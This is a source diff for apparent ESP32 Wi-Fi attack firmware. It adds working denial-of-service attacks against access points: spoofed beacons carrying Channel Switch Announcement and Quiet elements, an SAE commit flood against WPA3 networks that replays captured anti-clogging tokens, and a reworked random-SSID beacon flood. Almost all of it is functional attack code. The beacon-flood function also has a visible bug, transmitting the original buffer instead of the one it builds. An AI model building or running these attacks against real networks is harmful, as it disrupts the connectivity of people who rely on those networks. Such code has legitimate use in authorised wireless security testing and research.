@@ -17,6 +17,14 @@ LinkedList<ProbeReqSsid>* probe_req_ssids;
 bool wifiScanRedraw = false;
 bool eapol_scan_send_deauth = false;
 
+uint8_t *current_act = nullptr;
+
+static mbedtls_ecp_group ecp_group;
+static mbedtls_ecp_point ecp_point;
+static mbedtls_mpi prec_int;
+static mbedtls_ctr_drbg_context ctr_drbg;
+static mbedtls_entropy_context entropy;
+
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     if (arg == 31337)
       return 1;
@@ -104,7 +112,18 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 		for (int i = 0; i < 55; i++) sendProbeAttack();
 	}
 	else if (attack_mode == WIFI_ATTACK_RND_BEACON) {
-		for (int i = 0; i < 55; i++) sendBeaconRandomSSID();
+		static long long execttime = millis();
+		sendBeaconRandomSSID();
+		while (millis() - execttime < 1000) {
+			#ifdef BOARD_ESP32_C5_DEVKIT_C1
+				set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
+			#else
+				set_channel = random(0, 12);
+			#endif
+			changeChannel();
+			vTaskDelay(1 / portTICK_PERIOD_MS);
+			execttime = millis();
+		}
 	}
 	else if (attack_mode == WIFI_ATTACK_FUN_BEACON) {
 		for (int i = 0; i < 7; i++) {
@@ -175,6 +194,36 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 			}
 		}
 	}
+	else if (attack_mode == WIFI_ATTACK_CSA) {
+		for (int i = 0; i < access_points->size(); i++) {
+			if (access_points->get(i).selected) {
+				sendQuietCsaAttack(access_points->get(i), true);
+			}
+		}
+	}
+	else if (attack_mode == WIFI_ATTACK_QUIET) {
+		for (int i = 0; i < access_points->size(); i++) {
+			if (access_points->get(i).selected) {
+				sendQuietCsaAttack(access_points->get(i), false);
+			}
+		}
+	}
+	else if (attack_mode == WIFI_ATTACK_SAE_COMMIT) {
+		for (int i = 0; i < access_points->size(); i++) {
+			if (access_points->get(i).selected) {
+				if (this->set_channel != access_points->get(i).channel) {
+					this->set_channel = access_points->get(i).channel;
+					changeChannel();
+				}
+				uint8_t random_mac[6];
+				generateRandomMac(random_mac);
+
+				if (!sendSAECommitFrame(access_points->get(i).bssid, random_mac)) {
+					//Serial.println("[ERROR] Failed to send SAE Commit frame");
+				}
+			}
+		}
+	}
 }
 
 void WiFiModules::StartMode(WiFiScanState mode) {
@@ -210,6 +259,13 @@ void WiFiModules::StartMode(WiFiScanState mode) {
 	}
 	else if (mode == WIFI_SCAN_CH_ANALYZER) {
 		this->StartAnalyzerScan();
+	}
+	else if (mode == WIFI_SCAN_SAE_COMMIT) {
+		this->SAEScan(false);
+	}
+	else if (mode == WIFI_ATTACK_SAE_COMMIT) {
+		this->SAEScan(true);
+		Serial.println("[INFO] Starting [SAE Commit] Attack!");
 	}
 	else if (mode == WIFI_ATTACK_DEAUTH) {
 		this->StartWiFiAttack(mode);
@@ -259,6 +315,17 @@ void WiFiModules::StartMode(WiFiScanState mode) {
 		this->StartWiFiAttack(mode);
 		Serial.println("[INFO] Starting [Association Sleep All] Attack!");
 	}
+	else if (mode == WIFI_ATTACK_CSA) {
+		this->StartWiFiAttack(mode);
+		Serial.println("[INFO] Starting [Channel Switch Announcement] Attack!");
+	}
+	else if (mode == WIFI_ATTACK_QUIET) {
+		this->StartWiFiAttack(mode);
+		Serial.println("[INFO] Starting [Quiet] Attack!");
+	}
+	else {
+		Serial.println("[ERROR] Invalid WiFi mode selected");
+	}
 }
 
 void WiFiModules::StartWiFiAttack(WiFiScanState attack_mode) {
@@ -282,6 +349,51 @@ void WiFiModules::StartWiFiAttack(WiFiScanState attack_mode) {
 	wifi_initialized = true;
 	Serial.println("[INFO] WiFi re-initialized successfully");
 	Serial.println("[INFO] Ready to attack!");
+}
+
+inline uint16_t WiFiModules::le16(const uint8_t *p) {
+  return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
+}
+
+bool WiFiModules::sae_group_sizes(uint16_t group, size_t &scalar_len, size_t &element_len) {
+  switch (group) {
+    case 19: scalar_len = 32; element_len = 64; return true;   // P-256
+    case 20: scalar_len = 48; element_len = 96; return true;   // P-384
+    case 21: scalar_len = 66; element_len = 132; return true;  // P-521
+    default: return false;
+  }
+}
+
+
+bool WiFiModules::mac_cmp(const uint8_t *a, const uint8_t *b) {
+  return memcmp(a, b, 6) == 0;
+}
+
+int WiFiModules::mbedtls_entropy_source(void *data, unsigned char *output, size_t len) {
+  (void)data;
+
+  esp_fill_random(output, len);
+
+  return 0;
+}
+
+bool WiFiModules::initMbedtls() {
+  const char *personalization = "initmbedtls";
+
+  mbedtls_entropy_init(&entropy);
+  mbedtls_ctr_drbg_init(&ctr_drbg);
+
+  if (mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_source, NULL, (const unsigned char *) personalization, strlen(personalization)) != 0)
+    return false;
+
+  mbedtls_ecp_group_init(&ecp_group);
+  mbedtls_ecp_point_init(&ecp_point);
+  mbedtls_mpi_init(&prec_int);
+
+  if (mbedtls_ecp_group_load(&ecp_group, MBEDTLS_ECP_DP_SECP256R1) != 0)
+    return false;
+
+  return true;
 }
 
 void WiFiModules::setMac() {
@@ -1228,6 +1340,83 @@ void WiFiModules::analyzerWiFiSnifferCallback(void* buf, wifi_promiscuous_pkt_ty
 	}
 }
 
+void WiFiModules::SAECommitSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+	extern WiFiModules wifi;
+	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
+	int len = snifferPacket->rx_ctrl.sig_len;
+
+	uint8_t src_addr[] = {snifferPacket->payload[10],
+							snifferPacket->payload[11],
+							snifferPacket->payload[12],
+							snifferPacket->payload[13],
+							snifferPacket->payload[14],
+							snifferPacket->payload[15]};
+
+	uint8_t dst_addr[] = {snifferPacket->payload[4],
+							snifferPacket->payload[5],
+							snifferPacket->payload[6],
+							snifferPacket->payload[7],
+							snifferPacket->payload[8],
+							snifferPacket->payload[9]};
+	if (type == WIFI_PKT_MGMT) {
+		uint16_t group = 0;
+		size_t act_len = 0;
+		size_t act_off = 0;
+
+		String src_addr_str = macToString(src_addr);
+		String dst_addr_str = macToString(dst_addr);
+
+		if (wifi.getSAEACT(snifferPacket->payload, len, group, act_len)) 
+			if (wifi.sae_scan) {
+				
+				display_buffer->add(src_addr_str);
+				display_buffer->add("->" + dst_addr_str);
+				wifiScanRedraw = true;
+				Serial.println("[INFO] " + src_addr_str + " -> " + dst_addr_str);
+				if (act_len > 0) {
+					Serial.print(F(" ACT: "));
+					Serial.print(hexDump(current_act, act_len));
+				}
+
+				Serial.print(F(" Frame Len: "));
+				Serial.println(len);
+
+				logutils.pcapAppend(snifferPacket, len);
+        }
+    }
+}
+
+void WiFiModules::SAEScan(bool attack) {
+	if (!attack) Serial.println("[INFO] Starting Simultaneous Authentication of Equals (SAE) scan...");
+
+	logutils.createFile("sae", true);
+
+	this->sae_scan = !attack;
+
+	if (attack) {
+		this->initMbedtls();
+		esp_wifi_init(&cfg);
+	}
+	else esp_wifi_init(&cfg2);
+
+	#ifdef BOARD_ESP32_C5_DEVKIT_C1
+		esp_wifi_set_country(&country);
+		esp_event_loop_create_default();
+  	#endif
+
+	esp_wifi_set_storage(WIFI_STORAGE_RAM);
+	if (attack) esp_wifi_set_mode(WIFI_MODE_STA);
+	else esp_wifi_set_mode(WIFI_MODE_NULL);
+	esp_wifi_start();
+	this->setMac();
+	esp_wifi_set_promiscuous(true);
+	esp_wifi_set_promiscuous_filter(&filt);
+	esp_wifi_set_promiscuous_rx_cb(&SAECommitSnifferCallback);
+	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+	wifi_initialized = true;
+	vTaskDelay(100 / portTICK_PERIOD_MS);
+}
+
 void WiFiModules::StartAnalyzerScan() {
 
 	Serial.println("[INFO] Starting Analyzer scan...");
@@ -1490,6 +1679,95 @@ void WiFiModules::StartAPWiFiScanOld() { // using old scan to scan wifi
     Serial.println("[INFO] Scan completed successfully! Networks in list: " + String(access_points->size()));
 }
 
+void WiFiModules::sendQuietCsaAttack(AccessPoint target_ap, bool csa) {
+	if (!wifi_initialized) {
+		Serial.println("[ERROR] WiFi is not initialized, cannot send [Quiet] or [CSA] attack.");
+		return;
+	}
+
+	const uint8_t* post = nullptr;
+  	int post_len = 0;
+
+	static const uint8_t post_csa[] = {
+		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+		0x03, 0x01, 0x00,
+		0x25, 0x03, 0x01, 0x00, 0xff
+	};
+
+	static const uint8_t post_quiet[] = {
+		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+		0x03, 0x01, 0x00, 0x07, 0x06, 0x55, 0x53, 0x20,
+		0x64, 0x0b, 0x14, 0x20, 0x01, 0x00, 0x05, 0x04, 0x00, 0x01,
+		0x00, 0x00, 0x32, 0x04, 0x0c, 0x12, 0x18, 0x60, 0x28, 0x06,
+		0x01, 0x05, 0xff, 0xff, 0x00, 0x64
+	};
+
+	uint8_t target_channel = target_ap.channel;
+
+	if (csa) {
+		set_channel = target_ap.channel;
+		while (target_channel == target_ap.channel) {
+			#ifdef BOARD_ESP32_C5_DEVKIT_C1
+				target_channel = dual_band_channels[random(DUAL_BAND_CHANNELS)];
+			#else
+				target_channel = random(14) + 1;
+			#endif
+		}
+	} else {
+		set_channel = target_ap.channel;
+	}
+
+	changeChannel();
+	vTaskDelay(1 / portTICK_PERIOD_MS);
+
+	uint8_t temp[64]; // big enough for worst case
+	if (csa) {
+		memcpy(temp, post_csa, sizeof(post_csa));
+		temp[12] = target_ap.channel;
+		temp[16] = target_channel;
+		post = temp;
+		post_len = sizeof(post_csa);
+	} else {
+		memcpy(temp, post_quiet, sizeof(post_quiet));
+		temp[12] = target_ap.channel;
+		post = temp;
+		post_len = sizeof(post_quiet);
+	}
+
+	for (int i = 0; i < 6; i++) {
+		beacon_frame_packet[10 + i] = target_ap.bssid[i];
+		beacon_frame_packet[16 + i] = beacon_frame_packet[10 + i];
+	}
+
+	char ESSID[target_ap.essid.length() + 1] = {};
+  	target_ap.essid.toCharArray(ESSID, target_ap.essid.length() + 1);
+
+	int realLen = strlen(ESSID);
+	
+	beacon_frame_packet[37] = realLen;
+
+	for(int i = 0; i < realLen; i++) beacon_frame_packet[38 + i] = ESSID[i];
+
+	memcpy(beacon_frame_packet + (38 + realLen), post, post_len);
+
+	beacon_frame_packet[34] = target_ap.beacon[0];
+	beacon_frame_packet[35] = target_ap.beacon[1];
+	
+
+	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
+
+	packet_sent = packet_sent + 3;
+
+    if (res_1 != ESP_OK)
+		packet_sent -= 1;
+    if (res_2 != ESP_OK)
+		packet_sent -= 1;
+    if (res_3 != ESP_OK)
+		packet_sent -= 1;
+}
+
 // https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp
 void WiFiModules::sendCustomBeacon(AccessPoint custom_ssid) {
 	if (!wifi_initialized) {
@@ -1525,8 +1803,19 @@ void WiFiModules::sendCustomBeacon(AccessPoint custom_ssid) {
 	
 	beacon_frame_packet[50 + ssidLen] = set_channel;
 
-	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
+	const uint8_t* post = nullptr;
+	int post_len = 0;
+
+	static const uint8_t post_base[] = {
+		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+		0x03, 0x01, 0x04
+	};
+
+	uint8_t temp[64]; // big enough for worst case
+	post = post_base;
+    post_len = sizeof(post_base);
+
+	memcpy(beacon_frame_packet + (38 + ssidLen), post, post_len);
 
 	beacon_frame_packet[34] = custom_ssid.beacon[0];
 	beacon_frame_packet[35] = custom_ssid.beacon[1];
@@ -1601,39 +1890,46 @@ void WiFiModules::sendBeaconRandomSSID() {
 		return;
 	}
 
-	channelRandom();  
+	static const uint8_t post_base[] = {
+		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+		0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+		0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+		0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
+	};
+
+	//channelRandom();  
 
 	// Randomize SRC MAC
-	for (int i = 0; i < 6; i++) {
-		beacon_frame_packet[10 + i] = random(256);
-		beacon_frame_packet[16 + i] = beacon_frame_packet[10 + i];
-	}
+	int ssidLen = random(1, 33);
 
-	beacon_frame_packet[37] = 6;
+	int frame_len = 37 + sizeof(post_base) + ssidLen + 1;
+
+
+	uint8_t temp_frame[frame_len];
+	memcpy(temp_frame, beacon_frame_packet, frame_len);
+
+	temp_frame[10] = temp_frame[16] = (random(256) & 0xFE) | 0x02;
+	temp_frame[11] = temp_frame[17] = random(256);
+	temp_frame[12] = temp_frame[18] = random(256);
+	temp_frame[13] = temp_frame[19] = random(256);
+	temp_frame[14] = temp_frame[20] = random(256);
+	temp_frame[15] = temp_frame[21] = random(256);
+
+	temp_frame[37] = ssidLen;
+
+	for (int i = 0; i < ssidLen; i++)
+		temp_frame[38 + i] = alfa[random(65)];
 	
+	temp_frame[50 + ssidLen] = set_channel;
+
+	int post_len = sizeof(post_base);
+
+	memcpy(temp_frame + (38 + ssidLen), post_base, post_len);
+
+	esp_err_t res;
+	for (int i = 0; i < 2; i++)	res = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
 	
-	// Randomize SSID (Fixed size 6. Lazy right?)
-	beacon_frame_packet[38] = alfa[random(65)];
-	beacon_frame_packet[39] = alfa[random(65)];
-	beacon_frame_packet[40] = alfa[random(65)];
-	beacon_frame_packet[41] = alfa[random(65)];
-	beacon_frame_packet[42] = alfa[random(65)];
-	beacon_frame_packet[43] = alfa[random(65)];
-	
-	beacon_frame_packet[56] = set_channel;
-
-	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
-
-
-
-	// Add everything that goes after the SSID
-	for(int i = 0; i < 12; i++) 
-		beacon_frame_packet[38 + 6 + i] = postSSID[i];
-
-	esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
-	
-	packet_sent = packet_sent + 1;
+	packet_sent = packet_sent + 2;
     if (res != ESP_OK)
         packet_sent -= 1;
 }
@@ -1991,4 +2287,134 @@ void WiFiModules::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int 
   
 	packet_sent += 1;
 
+}
+
+bool WiFiModules::filterActive() {
+  for (int i = 0; i < access_points->size(); i++) {
+    if (access_points->get(i).selected)
+      return true;
+  }
+
+  return false;
+}
+
+
+bool WiFiModules::sendSAECommitFrame(uint8_t target_mac[6], uint8_t src_mac[6]) {
+	uint8_t frame[256];
+	uint8_t ecp_point_bin[65];
+	size_t bin_len = 0;
+	int write_bin_result = -1;
+
+	memset(frame, 0, sizeof(frame));
+
+	for (int i = 0; i < 32; i++) // Copy frame header
+		frame[i] = sae_commit_packet[i];
+
+	for (int i = 0; i < 6; i++) { // Copy addresses
+		frame[4 + i] = target_mac[i];
+		frame[10 + i] = src_mac[i];
+		frame[16 + i] = target_mac[i];
+	}
+
+	frame[30] = 0x13;  // SAE Group
+
+	uint8_t *current_index = frame + 32;
+	size_t scalar_len = 32;
+
+	if (mbedtls_mpi_fill_random(&prec_int, scalar_len, mbedtls_ctr_drbg_random, &ctr_drbg) != 0)
+		return false;
+
+	// Repeat only if invalid
+	while (mbedtls_mpi_cmp_int(&prec_int, 1) <= 0 || mbedtls_mpi_cmp_mpi(&prec_int, &ecp_group.N) >= 0) {
+		if (mbedtls_mpi_fill_random(&prec_int, scalar_len, mbedtls_ctr_drbg_random, &ctr_drbg) != 0)
+		return false;
+	}
+
+	if (mbedtls_mpi_write_binary(&prec_int, current_index, scalar_len) != 0) return false;
+
+	if (mbedtls_ecp_mul(&ecp_group, &ecp_point, &prec_int, &ecp_group.G, mbedtls_ctr_drbg_random, &ctr_drbg) != 0) return false;
+
+	write_bin_result = mbedtls_ecp_point_write_binary(&ecp_group, &ecp_point, MBEDTLS_ECP_PF_UNCOMPRESSED, &bin_len, ecp_point_bin, sizeof(ecp_point_bin));
+
+	if ((write_bin_result != 0) || (bin_len != 65)) return false;
+
+	for (size_t i = 0; i < scalar_len; i++)
+		current_index++;
+
+	for (size_t i = 0; i < 64; i++)
+		current_index[i] = ecp_point_bin[i + 1];
+
+	for (int i = 0; i < 64; i++)
+		current_index++;
+
+	// If ACT exists, append it to the frame
+	if (this->current_act_len > 0 && current_act != NULL) {
+		*current_index++ = 0x4C; // ACT required
+
+		*current_index++ = this->current_act_len;
+
+		for (size_t i = 0; i < this->current_act_len; i++)
+		current_index[i] = current_act[i];
+
+		for (int i = 0; i < this->current_act_len; i++)
+		current_index++;
+	}
+
+	if (esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK)
+		return false;
+
+	this->data_frames++;
+
+	return true;
+}
+
+bool WiFiModules::getSAEACT(const uint8_t *frame, size_t frame_len, uint16_t &group_out, size_t &act_len_out) {
+  extern WiFiModules wifi;
+
+  bool is_sae = false;
+  uint8_t frame_header_len = 32;
+  bool ap_found = false;
+
+  // Filter on SAE commit
+  if ((frame_len > frame_header_len) &&
+      (frame[0] == 0xB0) &&
+      (frame[24] == 0x03) &&
+      (frame[26] == 0x01)) {
+    is_sae = true;
+
+    // Check if filtering on AP
+    if (wifi.filterActive()) {
+      uint8_t src_addr[6];
+      getMAC(src_addr, frame, 10);
+      for (int i = 0; i < access_points->size(); i++) {
+        if (wifi.mac_cmp(src_addr, access_points->get(i).bssid)) {
+          ap_found = true;
+          break;
+        }
+      }
+
+      if (!ap_found)
+        return false;
+    }
+
+    // Filter on ACT required
+    if (frame[28] == 0x4C) {
+
+      const uint8_t *act_index = frame + frame_header_len;
+      act_len_out = frame_len - frame_header_len;
+
+      // Copy ACT
+      if (act_len_out != 0) {
+        if (current_act)
+          free(current_act);
+
+        current_act = (uint8_t *)malloc(act_len_out);
+        if (current_act) {
+          memcpy(current_act, act_index, act_len_out);
+        }
+      }
+    }
+  }
+
+  return is_sae;
 }
